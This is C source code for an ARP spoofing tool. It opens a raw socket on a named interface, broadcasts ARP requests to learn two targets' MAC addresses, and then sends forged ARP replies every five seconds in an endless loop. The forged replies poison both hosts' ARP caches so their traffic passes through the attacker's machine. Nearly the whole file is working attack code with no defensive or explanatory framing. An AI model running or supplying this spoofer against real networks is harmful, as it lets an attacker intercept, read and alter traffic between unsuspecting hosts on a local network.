#include "ARP_Spoofer.h"

struct spoofer* 
init_spoofing(const char* const if_name, const IP frst_ip, const IP scnd_ip, const MAC my_mac)
{
    __CheckNull(if_name);
    __CheckNull(frst_ip);
    __CheckNull(scnd_ip);
    __CheckNull(my_mac)

    struct spoofer* spoofer = (struct spoofer*) malloc(sizeof(*spoofer));
    __CheckNull(spoofer);

    struct sockaddr_ll* intrfc = (struct sockaddr_ll*) malloc(sizeof(*intrfc));
    __CheckNull(intrfc);

    int sock_raw;
    struct timeval tv;
    tv.tv_sec = RECV_TIME_OUT;
    tv.tv_usec = 0;

    __CheckErr((intrfc->sll_ifindex = if_nametoindex(if_name)) == 0,
    "INTERFACE NOT EXISTS: make sure interface name is correct\n");

    __CheckErr((sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0, 
        "Socket Initilizing Failed\n");

    __CheckErr(setsockopt(sock_raw, SOL_SOCKET, SO_BINDTODEVICE, if_name, strlen(if_name)) < 0,
        "SOCKET OPTION FAILED: setting interface to socket failed\n");

    __CheckErr(setsockopt(sock_raw, SOL_SOCKET, SO_RCVTIMEO, (const char*) &tv, sizeof(tv)) < 0,
        "SOCKET OPTION FAILED: setting recv time out to socket failed\n");

    spoofer->sock_fd = sock_raw;
    spoofer->interfc = intrfc;
    memcpy(spoofer->frst_ip, frst_ip, sizeof(IP));
    memcpy(spoofer->scnd_ip, scnd_ip, sizeof(IP));
    memcpy(spoofer->my_mac , my_mac, sizeof(MAC));
    memset(spoofer->frst_mc, 0, sizeof(MAC));
    memset(spoofer->scnd_mc, 0, sizeof(MAC));

    LOG(">> Spoofer Initiliized Successfully\n");
    
    return spoofer;
}

static void
get_target_mac_helper(int sock_fd, const IP target_ip, MAC target_mac)
{
    uint8_t buffer[ETHER_MAX_LEN];

    char  str_ip[IP_LEN*4];
    sprintf(str_ip, IP_FORMAT(target_ip));
    
    LOG(">> Listening To Get Mac Address of %s ...\n", str_ip);

    while(1)
    {
        __CheckErr((recv(sock_fd, buffer, ETHER_MAX_LEN, 0)) < 0,
            "TIME OUT: make sure host is up\n");

        struct ethfrm* eth = (struct ethfrm*) buffer;

        if(eth->eth_hdr.h_proto != htons(ETH_P_ARP) 
            || eth->eth_pld.arp_hdr.ar_op != htons(ARPOP_REPLY)
            || memcmp(&eth->eth_pld.arp_pld.SPA, target_ip, sizeof(IP)))
            continue;
        
        memcpy(target_mac, eth->eth_pld.arp_pld.SHA, sizeof(MAC));

        char str_mac[MAC_LEN*3];
        sprintf(str_mac, MAC_FORMAT(target_mac));

        LOG(">> Got Target Mac Address Successfully: %s -> %s\n", str_ip , str_mac);

        break;
    }
}


void 
get_targets_mac(const struct spoofer* spoofer)
{
    {
        struct arppkt* pkt = make_arp_pkt(spoofer->my_mac, spoofer->frst_ip, BROADCAST, spoofer->scnd_ip, ARPOP_REQUEST);
        __CheckNull(pkt);

        struct ethfrm* frm = make_eth_arp_frm(spoofer->my_mac, BROADCAST, pkt);
        __CheckNull(frm);

        __CheckErr((sendto(spoofer->sock_fd, frm, sizeof(*frm), 0, (const struct sockaddr*) spoofer->interfc, sizeof(*spoofer->interfc)) < 0) ,
            "BROADCAST FAILED: sending spoofed IP to broadcast failed\n");

        LOG(">> Spoofed IP Broadcated Successfully\n");

        get_target_mac_helper(spoofer->sock_fd, spoofer->scnd_ip, spoofer->scnd_mc);

        free(frm);
        free(pkt);
    }

    {
        struct arppkt* pkt = make_arp_pkt(spoofer->my_mac, spoofer->scnd_ip, BROADCAST, spoofer->frst_ip, ARPOP_REQUEST);
        __CheckNull(pkt);

        struct ethfrm* frm = make_eth_arp_frm(spoofer->my_mac, BROADCAST, pkt);
        __CheckNull(frm);

        __CheckErr((sendto(spoofer->sock_fd, frm, sizeof(*frm), 0, (const struct sockaddr*) spoofer->interfc, sizeof(*spoofer->interfc)) < 0) ,
            "BROADCAST FAILED: sending spoofed IP to broadcast failed\n");

        LOG(">> Spoofed IP Broadcated Successfully\n");

        get_target_mac_helper(spoofer->sock_fd, spoofer->frst_ip, spoofer->frst_mc);

        free(frm);
        free(pkt);
    }
}

void
send_spoofed_ip(const struct spoofer* const spoofer)
{  
    __CheckErr(memcmp(spoofer->scnd_mc, (IP) {0,0,0,0}, sizeof(IP)) == 0,
        "MAC ADDRESS NOT FOUND: make sure targets mac address is set\n");

    struct arppkt* frst_pkt = make_arp_pkt(spoofer->my_mac, spoofer->frst_ip, spoofer->scnd_mc, spoofer->scnd_ip, ARPOP_REPLY);
    __CheckNull(frst_pkt);

    struct ethfrm* frst_frm = make_eth_arp_frm(spoofer->my_mac, spoofer->scnd_mc, frst_pkt);
    __CheckNull(frst_frm);

    __CheckErr(memcmp(spoofer->frst_mc, (IP) {0,0,0,0}, sizeof(IP)) == 0,
        "MAC ADDRESS NOT FOUND: make sure targets mac address is set\n");

    struct arppkt* scnd_pkt = make_arp_pkt(spoofer->my_mac, spoofer->scnd_ip, spoofer->frst_mc, spoofer->frst_ip, ARPOP_REPLY);
    __CheckNull(scnd_pkt);

    struct ethfrm* scnd_frm = make_eth_arp_frm(spoofer->my_mac, spoofer->frst_mc, scnd_pkt);
    __CheckNull(scnd_frm);

    char str_ip[IP_LEN*4];

    while(1)
    {
        __CheckErr(sendto(spoofer->sock_fd, frst_frm, sizeof(*frst_frm), 0, (const struct sockaddr*) spoofer->interfc, sizeof(*spoofer->interfc)) < 0,
            "Sending Spoofed IP To Target Failed\n");

        sprintf(str_ip, IP_FORMAT(spoofer->scnd_ip));
        LOG(">> Spoofed IP Sent Successfully to %s\n", str_ip);

        __CheckErr(sendto(spoofer->sock_fd, scnd_frm, sizeof(*scnd_frm), 0, (const struct sockaddr*) spoofer->interfc, sizeof(*spoofer->interfc)) < 0,
            "Sending Spoofed IP To Target Failed\n");

        sprintf(str_ip, IP_FORMAT(spoofer->frst_ip));
        LOG(">> Spoofed IP Sent Successfully to %s\n", str_ip);

        sleep(5);
    }

    free(frst_pkt);
    free(frst_frm);
    free(scnd_pkt);
    free(scnd_frm);
}

void
free_spoofer(struct spoofer* spoofer)
{
    free(spoofer->interfc);
    free(spoofer);
}